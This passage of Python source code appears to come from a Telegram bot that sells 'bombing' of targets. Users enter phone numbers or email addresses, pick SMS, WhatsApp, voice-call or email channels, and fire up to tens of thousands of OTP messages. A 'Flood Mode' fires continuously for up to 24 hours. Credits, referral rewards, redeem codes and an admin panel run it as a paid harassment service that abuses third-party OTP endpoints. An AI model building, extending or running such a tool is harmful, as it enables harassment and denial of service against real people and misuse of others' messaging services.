                              url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}")],
    ]
    if admin:
        rows.append([InlineKeyboardButton(text="🛠 Admin Panel",
                                          callback_data="a:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]
    ])


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="m:home")]
    ])


def channel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Legacy All",   callback_data="m:chan:legacy"),
         InlineKeyboardButton(text="📱 SMS",          callback_data="m:chan:sms")],
        [InlineKeyboardButton(text="💬 WhatsApp",     callback_data="m:chan:whatsapp"),
         InlineKeyboardButton(text="📞 Voice Call",   callback_data="m:chan:call")],
        [InlineKeyboardButton(text="📧 Email",        callback_data="m:chan:email"),
         InlineKeyboardButton(text="🌐 EVERYTHING",   callback_data="m:chan:all")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def count_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="100",   callback_data="m:count:100"),
         InlineKeyboardButton(text="500",   callback_data="m:count:500"),
         InlineKeyboardButton(text="1000",  callback_data="m:count:1000")],
        [InlineKeyboardButton(text="5000",  callback_data="m:count:5000"),
         InlineKeyboardButton(text="10000", callback_data="m:count:10000"),
         InlineKeyboardButton(text="50000", callback_data="m:count:50000")],
        [InlineKeyboardButton(text="✍️ Custom Count",
                              callback_data="m:count:custom")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def flood_minutes_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="5 min",   callback_data="m:flood:5"),
         InlineKeyboardButton(text="15 min",  callback_data="m:flood:15")],
        [InlineKeyboardButton(text="30 min",  callback_data="m:flood:30"),
         InlineKeyboardButton(text="60 min",  callback_data="m:flood:60")],
        [InlineKeyboardButton(text="6 hours", callback_data="m:flood:360"),
         InlineKeyboardButton(text="24 hours", callback_data="m:flood:1440")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",       callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",       callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Add Credits", callback_data="a:add"),
         InlineKeyboardButton(text="➖ Deduct",      callback_data="a:ded")],
        [InlineKeyboardButton(text="🎁 Redeem",      callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",        callback_data="a:apis")],
        [InlineKeyboardButton(text="📧 SMTP",        callback_data="a:smtp"),
         InlineKeyboardButton(text="⚙️ Settings",    callback_data="a:settings")],
        [InlineKeyboardButton(text="📢 Broadcast",   callback_data="a:bcast"),
         InlineKeyboardButton(text="🔎 Find User",   callback_data="a:find")],
        [InlineKeyboardButton(text="🚫 Blacklist",   callback_data="a:black"),
         InlineKeyboardButton(text="⭐ VIP",         callback_data="a:vip")],
        [InlineKeyboardButton(text="👑 Admins",      callback_data="a:admins"),
         InlineKeyboardButton(text="📋 Logs",        callback_data="a:logs:0")],
        [InlineKeyboardButton(text="📤 Export",      callback_data="a:export"),
         InlineKeyboardButton(text="🏠 Main Menu",   callback_data="m:home")],
    ])


def admin_back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]
    ])


# ─────────────────────────────────────────────────────────────
# COMMANDS
# ─────────────────────────────────────────────────────────────
@dp.message(CommandStart(deep_link=True))
async def cmd_start_ref(m: types.Message, state: FSMContext):
    await state.clear()
    args = m.text.split(maxsplit=1)
    payload = args[1].strip() if len(args) > 1 else ""
    ref = None
    mm = re.match(r"^ref_(\d+)$", payload)
    if mm:
        ref = int(mm.group(1))
    u = ensure_user(m.from_user, referrer=ref)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n\n"
        f"Use the buttons below.",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


@dp.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n\n"
        f"Use the buttons below.",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(m.from_user.id):
        return
    await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())


@dp.message(Command("stop"))
async def cmd_stop(m: types.Message):
    ev = BOMB_STOPS.get(m.from_user.id)
    if ev:
        ev.set()
        await m.answer("🛑 Stop signal sent.")
    else:
        await m.answer("No active bomb.")


@dp.message(Command("reseed"))
async def cmd_reseed(m: types.Message):
    if not is_admin(m.from_user.id):
        return
    seed_all_endpoints(force_refresh=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    await m.answer(f"✅ endpoints reseeded. total: <b>{total}</b>")


# ─────────────────────────────────────────────────────────────
# MAIN MENU CALLBACKS
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:home")
async def cb_home(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🏠 <b>Main Menu</b>\n\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Bombs: <b>{u['total_bombs']}</b>",
        reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


@dp.callback_query(F.data == "m:cancel")
async def cb_cancel(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await c.message.edit_text(
        "❌ Cancelled.",
        reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


@dp.callback_query(F.data == "m:bal")
async def cb_bal(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    bot_me = await bot.get_me()
    ref_link = f"https://t.me/{bot_me.username}?start=ref_{u['user_id']}"
    await c.message.edit_text(
        f"💰 <b>Account</b>\n\n"
        f"🆔 <code>{u['user_id']}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Total bombs: <b>{u['total_bombs']}</b>\n"
        f"🔗 Referrals: <b>{u['ref_count']}</b>\n\n"
        f"<b>Your referral link:</b>\n<code>{ref_link}</code>\n"
        f"Earn {setting('referral_bonus')} credits per signup.",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:help")
async def cb_help(c: types.CallbackQuery):
    total_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                       fetch="one")["c"]
    await c.message.edit_text(
        "📖 <b>Help</b>\n\n"
        "<b>💣 Start Bomb</b>\n"
        "1. Send target phone/email\n"
        "2. Pick channel\n"
        "3. Pick count (or custom)\n"
        "4. Fires immediately — no waiting\n\n"
        "<b>☢️ Flood Mode</b>\n"
        f"Continuous fire for 5m → 24h. Cost: <b>{setting('flood_cost_per_min')}</b> credit/min.\n\n"
        "<b>Bulk targets:</b> <code>1234567890,9922458565</code>\n\n"
        "<b>Stop:</b> tap 🛑 or /stop\n\n"
        f"<b>Live endpoints:</b> <b>{total_apis}</b>",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:hist")
async def cb_hist(c: types.CallbackQuery):
    rows = _exec(
        "SELECT * FROM bomb_history WHERE user_id=? ORDER BY ts DESC LIMIT 10",
        (c.from_user.id,), fetch="all")
    if not rows:
        txt = "📜 No history."
    else:
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            lines.append(
                f"• [{r['category'] or '?'}] "
                f"<code>{r['target'][:30]}</code> x{r['count']} → "
                f"{r['ok']}✅ {r['fail']}❌ ({t})")
        txt = "📜 <b>Last 10 bombs</b>\n\n" + "\n".join(lines)
    await c.message.edit_text(txt, reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:stats")
async def cb_public_stats(c: types.CallbackQuery):
    users = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users",
                  fetch="one")["s"]
    total_apis = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                        fetch="one")["c"]
    per_cat = _exec(
        "SELECT category, COUNT(*) c FROM apis WHERE active=1 GROUP BY category",
        fetch="all")
    cat_lines = [f"  • {r['category'] or '?'}: <b>{r['c']}</b>" for r in per_cat]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{users}</b>\n"
        f"💥 Total bombs fired: <b>{bombs}</b>\n"
        f"🔌 Active endpoints: <b>{active_apis}/{total_apis}</b>\n\n"
        f"<b>By channel:</b>\n" + ("\n".join(cat_lines) or "  none"),
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:daily")
async def cb_daily(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    now = int(time.time())
    if now - u["last_daily"] < 86400:
        wait = 86400 - (now - u["last_daily"])
        h, rem = divmod(wait, 3600)
        mm = rem // 60
        return await c.answer(f"⏳ Next in {h}h {mm}m", show_alert=True)
    bonus = setting("daily_bonus", int)
    add_credits(c.from_user.id, bonus)
    _exec("UPDATE users SET last_daily=? WHERE user_id=?",
          (now, c.from_user.id))
    u2 = get_user(c.from_user.id)
    await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
    await c.message.edit_text(
        f"🎉 Daily bonus claimed! +{bonus}\n"
        f"💳 Balance: <b>{u2['credits']}</b>",
        reply_markup=back_kb())


# ─────────────────────────────────────────────────────────────
# BOMB FLOW
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:bomb")
async def cb_bomb_start(c: types.CallbackQuery, state: FSMContext):
    u = get_user(c.from_user.id)
    if u["banned"]:
        return await c.answer("You are banned.", show_alert=True)
    if setting("maintenance", int):
        return await c.answer("Maintenance mode.", show_alert=True)
    await state.set_state(UserFSM.bomb_target)
    await c.message.edit_text(
        "🎯 <b>Step 1/3 — Target</b>\n\n"
        "Send one target or comma-separated list.\n\n"
        "<b>Examples:</b>\n"
        "• <code>9922458565</code>\n"
        "• <code>9922458565,1234567890</code>\n"
        "• <code>user@example.com</code>",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_target)
async def fsm_bomb_target(m: types.Message, state: FSMContext):
    raw = m.text.strip()
    if not raw or len(raw) > 512:
        return await m.answer("❌ Invalid.", reply_markup=cancel_kb())
    targets = [t.strip() for t in raw.replace("\n", ",").split(",") if t.strip()]
    if not targets:
        return await m.answer("❌ No targets.", reply_markup=cancel_kb())
    await state.update_data(targets=targets)
    preview = ", ".join(targets[:5]) + ("..." if len(targets) > 5 else "")
    await m.answer(
        f"🎯 Targets ({len(targets)}): <code>{preview}</code>\n\n"
        f"<b>Step 2/3 — Channel</b>",
        reply_markup=channel_kb())


@dp.callback_query(F.data.startswith("m:chan:"))
async def cb_chan(c: types.CallbackQuery, state: FSMContext):
    chan = c.data.split(":")[2]
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired, start over", show_alert=True)
    cats = {
        "legacy":   ["legacy"],
        "sms":      ["sms"],
        "whatsapp": ["whatsapp"],
        "call":     ["call"],
        "email":    ["email", "smtp"],
        "all":      ["sms", "whatsapp", "call", "email", "smtp", "legacy"],
    }
    if chan not in cats:
        return await c.answer("bad")
    await state.update_data(categories=cats[chan], chan_label=chan)
    await c.message.edit_text(
        f"📡 Channel: <b>{chan.upper()}</b>\n\n"
        f"<b>Step 3/3 — Count</b>",
        reply_markup=count_kb())
    await c.answer()


@dp.callback_query(F.data == "m:count:custom")
async def cb_custom_count(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired", show_alert=True)
    await state.set_state(UserFSM.bomb_count)
    max_c = setting("max_count", int)
    await c.message.edit_text(
        f"✍️ <b>Custom Count</b>\n\n"
        f"Send any number 1–<b>{max_c}</b>.\n"
        f"Example: <code>2500</code>",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_count)
async def fsm_custom_count(m: types.Message, state: FSMContext):
    if not m.text.strip().isdigit():
        return await m.answer("❌ Send a number.", reply_markup=cancel_kb())
    count = int(m.text.strip())
    data = await state.get_data()
    await state.clear()
    await _start_bomb(m, m.from_user.id, data.get("targets"), count,
                      data.get("categories"), data.get("chan_label"))


@dp.callback_query(F.data.startswith("m:count:"))
async def cb_count(c: types.CallbackQuery, state: FSMContext):
    part = c.data.split(":")[2]
    if part == "custom":
        return
    try:
        count = int(part)
    except ValueError:
        return await c.answer("bad")
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired", show_alert=True)
    await state.clear()
    await _start_bomb(c.message, c.from_user.id, data["targets"], count,
                      data.get("categories") or ["legacy"],
                      data.get("chan_label") or "legacy", edit=True)
    await c.answer()


async def _start_bomb(msg, uid, targets, count, categories, chan_label,
                      edit=False):
    if not targets:
        return await msg.answer("no targets")
    u = get_user(uid)
    if u["banned"]:
        return
    max_c = setting("max_count", int)
    if count < 1 or count > max_c:
        return await msg.answer(f"❌ count must be 1..{max_c}")
    now = int(time.time())
    cooldown = setting("cooldown", int)
    if u["vip_cost"] <= 0 and now - u["last_bomb"] < cooldown:
        return await msg.answer(
            f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
    for t in targets:
        if is_blacklisted(t):
            return await msg.answer(f"🚫 <code>{t}</code> blacklisted")
    cost = u["vip_cost"] if u["vip_cost"] > 0 else setting("bomb_cost", int)
    if not take_credits(uid, cost):
        return await msg.answer(f"❌ need {cost} credits")
    _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 "
          "WHERE user_id=?", (now, uid))
    log_action(uid, "bomb", f"{len(targets)}tgt x{count} cat={chan_label}")

    stop_ev = asyncio.Event()
    BOMB_STOPS[uid] = stop_ev

    preview = ", ".join(targets[:3]) + ("..." if len(targets) > 3 else "")
    text = (
        f"🚀 <b>Launching</b>\n\n"
        f"🎯 {len(targets)} target(s): <code>{preview}</code>\n"
        f"📡 <b>{(chan_label or 'legacy').upper()}</b>\n"
        f"💥 Count: <b>{count}</b>\n\n"
        f"⚡ firing in ms..."
    )
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 Stop", callback_data="m:stop_bomb")]
    ])
    status = await (msg.edit_text(text, reply_markup=stop_kb) if edit
                    else msg.answer(text, reply_markup=stop_kb))
    asyncio.create_task(
        _run_and_report(status, uid, targets, count,
                        chan_label, categories, stop_ev))


@dp.callback_query(F.data == "m:stop_bomb")
async def cb_stop_bomb(c: types.CallbackQuery):
    ev = BOMB_STOPS.get(c.from_user.id)
    if ev:
        ev.set()
        await c.answer("🛑 Stopping...", show_alert=False)
    else:
        await c.answer("Nothing to stop.", show_alert=True)


async def _run_and_report(status_msg, uid, targets, count,
                          chan_label, categories, stop_ev):
    async def progress(ok, fail, done):
        try:
            await status_msg.edit_text(
                f"🚀 <b>Firing</b>\n\n"
                f"🎯 {len(targets)} target(s)\n"
                f"📡 <b>{(chan_label or 'legacy').upper()}</b>\n"
                f"📨 Sent: <b>{ok}</b>  ❌ {fail}\n"
                f"⏩ Progress: <b>{done}/{count}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛑 Stop",
                                          callback_data="m:stop_bomb")]
                ]))
        except Exception:
            pass

    try:
        ok, fail, err = await bomb_engine(
            targets, count, "OTP", categories, stop_ev=stop_ev,
            progress_cb=progress)
        if err:
            text = f"⚠️ {err}"
        else:
            text = (
                f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Done</b>\n\n"
                f"🎯 {len(targets)} target(s)\n"
                f"📡 <b>{(chan_label or 'legacy').upper()}</b>\n"
                f"📨 Sent: <b>{ok}</b>  ❌ Failed: <b>{fail}</b>\n"
                f"💳 Balance: <b>{get_user(uid)['credits']}</b>"
            )
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
              "category,ts) VALUES(?,?,?,?,?,?,?,?)",
              (uid, ",".join(targets)[:200], count, "OTP", ok, fail,
               chan_label, int(time.time())))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💣 Bomb Again", callback_data="m:bomb"),
             InlineKeyboardButton(text="🏠 Main Menu",  callback_data="m:home")]
        ])
        try:
            await status_msg.edit_text(text, reply_markup=kb)
        except Exception:
            pass
    except Exception as e:
        log.exception("bomb crashed")
        try:
            await status_msg.edit_text(
                f"⚠️ crashed: <code>{e}</code>", reply_markup=back_kb())
        except Exception:
            pass
    finally:
        BOMB_STOPS.pop(uid, None)


# ─────────────────────────────────────────────────────────────
# FLOOD MODE
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:flood")
async def cb_flood_start(c: types.CallbackQuery, state: FSMContext):
    u = get_user(c.from_user.id)
    if u["banned"]:
        return await c.answer("You are banned.", show_alert=True)
    if setting("maintenance", int):
        return await c.answer("Maintenance mode.", show_alert=True)
    await state.set_state(UserFSM.flood_target)
    await c.message.edit_text(
        "☢️ <b>FLOOD MODE</b>\n\n"
        f"Continuous fire (max {FLOOD_MAX_MINUTES} min).\n"
        f"Cost: <b>{setting('flood_cost_per_min')}</b> credit/min.\n\n"
        "Send target phone number:",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.flood_target)
async def fsm_flood_target(m: types.Message, state: FSMContext):
    raw = m.text.strip()
    digits = "".join(ch for ch in raw if ch.isdigit())
    if len(digits) < 10:
        return await m.answer("❌ Invalid phone.", reply_markup=cancel_kb())
    await state.update_data(target=digits[-10:])
    await state.set_state(None)
    await m.answer(
        "⏱ <b>Pick duration</b>",
        reply_markup=flood_minutes_kb())


@dp.callback_query(F.data.startswith("m:flood:"))
async def cb_flood_minutes(c: types.CallbackQuery, state: FSMContext):
    try:
        minutes = int(c.data.split(":")[2])
    except ValueError:
        return await c.answer("bad")
    if minutes < 1 or minutes > FLOOD_MAX_MINUTES:
        return await c.answer("out of range", show_alert=True)
    data = await state.get_data()
    target = data.get("target")
    if not target:
        await state.clear()
        return await c.answer("expired", show_alert=True)
    await state.clear()
    await _start_flood(c.message, c.from_user.id, target, minutes, edit=True)
    await c.answer()


async def _start_flood(msg, uid, target, minutes, edit=False):
    u = get_user(uid)
    cost_per_min = setting("flood_cost_per_min", int)
    total_cost = minutes * cost_per_min
    if not take_credits(uid, total_cost):
        return await msg.answer(
            f"❌ need {total_cost} credits for {minutes} min "
            f"(@ {cost_per_min}/min). Balance: {u['credits']}")
    log_action(uid, "flood", f"{target} {minutes}min")
    stop_ev = asyncio.Event()
    BOMB_STOPS[uid] = stop_ev

    text = (
        f"☢️ <b>FLOODING</b>\n\n"
        f"🎯 <code>{target}</code>\n"
        f"⏱ Duration: <b>{minutes}</b> min\n"
        f"💳 Cost: <b>{total_cost}</b> credits\n"
        f"📡 Channels: ALL"
    )
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 Stop Flood",
                              callback_data="m:stop_bomb")]
    ])
    status = await (msg.edit_text(text, reply_markup=stop_kb) if edit
                    else msg.answer(text, reply_markup=stop_kb))

    asyncio.create_task(_run_flood(status, uid, target, minutes, stop_ev))


async def _run_flood(status_msg, uid, target, minutes, stop_ev):
    end_at = time.time() + minutes * 60
    total_ok = total_fail = 0
    all_cats = ["sms", "whatsapp", "call", "email", "smtp", "legacy"]
    last_edit = 0
    try:
        while time.time() < end_at and not stop_ev.is_set():
            ok, fail, err = await bomb_engine(
                [target], 500, "OTP", all_cats, stop_ev=stop_ev)
            total_ok += ok
            total_fail += fail
            if err:
                log.warning("flood err: %s", err)
                break
            now = time.time()
            if now - last_edit >= 4:
                last_edit = now
                remaining = max(0, int(end_at - now))
                mm, ss = divmod(remaining, 60)
                try:
                    await status_msg.edit_text(
                        f"☢️ <b>FLOODING</b>\n\n"
                        f"🎯 <code>{target}</code>\n"
                        f"⏳ Remaining: <b>{mm}m {ss}s</b>\n"
                        f"📨 Sent: <b>{total_ok}</b>  ❌ {total_fail}",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="🛑 Stop",
                                                  callback_data="m:stop_bomb")]
                        ]))
                except Exception:
                    pass
    finally:
        BOMB_STOPS.pop(uid, None)
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
              "category,ts) VALUES(?,?,?,?,?,?,?,?)",
              (uid, target, total_ok + total_fail, "FLOOD", total_ok,
               total_fail, "flood", int(time.time())))
        try:
            await status_msg.edit_text(
                f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Flood ended</b>\n\n"
                f"🎯 <code>{target}</code>\n"
                f"📨 Sent: <b>{total_ok}</b>  ❌ {total_fail}\n"
                f"💳 Balance: <b>{get_user(uid)['credits']}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🏠 Main Menu",
                                          callback_data="m:home")]
                ]))
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
# REDEEM FLOW
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:redeem")
async def cb_redeem_start(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(UserFSM.redeem_code)
    await c.message.edit_text(
        "🎁 <b>Redeem Code</b>\n\nSend your code.",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.redeem_code)
async def fsm_redeem(m: types.Message, state: FSMContext):
    code = m.text.strip().upper()
    await state.clear()
    row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1",
                (code,), fetch="one")
    if not row:
        return await m.answer("❌ Invalid code.",
                              reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if row["used"] >= row["max_uses"]:
        return await m.answer("❌ Code exhausted.",
                              reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?",
             (code, m.from_user.id), fetch="one"):
        return await m.answer("❌ Already used.",
                              reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    add_credits(m.from_user.id, row["amount"])
    _exec("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
          (code, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "redeem", f"{code} +{row['amount']}")
    await m.answer(
        f"✅ Redeemed! +{row['amount']} credits\n"
        f"💳 Balance: <b>{get_user(m.from_user.id)['credits']}</b>",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


# ─────────────────────────────────────────────────────────────
# ADMIN PANEL
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "a:home")
async def cb_admin_home(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.clear()
    await c.message.edit_text("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:stats")
async def cb_stats(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    banned = _exec("SELECT COUNT(*) c FROM users WHERE banned=1",
                   fetch="one")["c"]
    credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users",
                    fetch="one")["s"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users",
                  fetch="one")["s"]
    codes = _exec("SELECT COUNT(*) c FROM redeem_codes WHERE active=1",
                  fetch="one")["c"]
    admins_n = _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"]
    smtps = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1",
                  fetch="one")["c"]
    per_cat = _exec(
        "SELECT category, COUNT(*) c, COALESCE(SUM(ok_count),0) o, "
        "COALESCE(SUM(fail_count),0) f FROM apis WHERE active=1 "
        "GROUP BY category", fetch="all")
    cat_lines = [
        f"  • <b>{r['category'] or '?'}</b>: {r['c']} active, "
        f"{r['o']}✅ {r['f']}❌" for r in per_cat
    ]
    up = int(time.time()) - START_TIME
    h, rem = divmod(up, 3600)
    mm = rem // 60
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"⏱ Uptime: <b>{h}h {mm}m</b>\n"
        f"👥 Users: <b>{total}</b> (banned {banned})\n"
        f"👑 Admins: <b>{admins_n}</b>\n"
        f"💳 Credits in circulation: <b>{credits}</b>\n"
        f"💥 Total bombs: <b>{bombs}</b>\n"
        f"🎁 Active codes: <b>{codes}</b>\n"
        f"📧 Active SMTP: <b>{smtps}</b>\n\n"
        f"<b>Channels:</b>\n" + ("\n".join(cat_lines) or "  none"),
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_users(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 10
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM users ORDER BY created_at DESC "
                 "LIMIT ? OFFSET ?", (per, page * per), fetch="all")
    lines = [
        f"{'🚫' if r['banned'] else '✅'} <code>{r['user_id']}</code> "
        f"@{r['username'] or '-'} | 💳{r['credits']} | 💥{r['total_bombs']}"
        for r in rows
    ]
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:users:{page-1}"))
    if page < max_p:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:users:{page+1}"))
    kb = ([nav] if nav else []) + \
         [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(
        f"👥 <b>Users</b> (page {page+1}/{max_p+1})\n\n" +
        ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:admins")
async def cb_admins(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM admins ORDER BY added_at", fetch="all")
    lines = [f"👑 <code>{r['user_id']}</code>" for r in rows]
    await c.message.edit_text(
        "👑 <b>Admins</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:admin_add"),
             InlineKeyboardButton(text="🗑 Remove",
                                  callback_data="a:admin_remove")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:admin_add")
async def cb_admin_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_admin_id)
    await c.message.edit_text("👑 Send user_id to promote.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_admin_id)
async def fsm_admin_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    if not get_user(uid):
        return await m.answer("user must /start the bot first")
    _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
          "VALUES(?,?,?)", (uid, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_add", str(uid))
    await state.clear()
    await m.answer(f"✅ <code>{uid}</code> is now admin.",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:admin_remove")
async def cb_admin_remove(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.remove_admin_id)
    await c.message.edit_text("👑 Send user_id to demote.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.remove_admin_id)
async def fsm_admin_remove(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    if uid == m.from_user.id:
        return await m.answer("can't remove yourself")
    _exec("DELETE FROM admins WHERE user_id=?", (uid,))
    log_action(m.from_user.id, "admin_remove", str(uid))
    await state.clear()
    await m.answer(f"✅ <code>{uid}</code> removed.",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:add")
async def cb_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await c.message.edit_text("➕ Send target user_id",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_credits_uid)
async def fsm_add_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
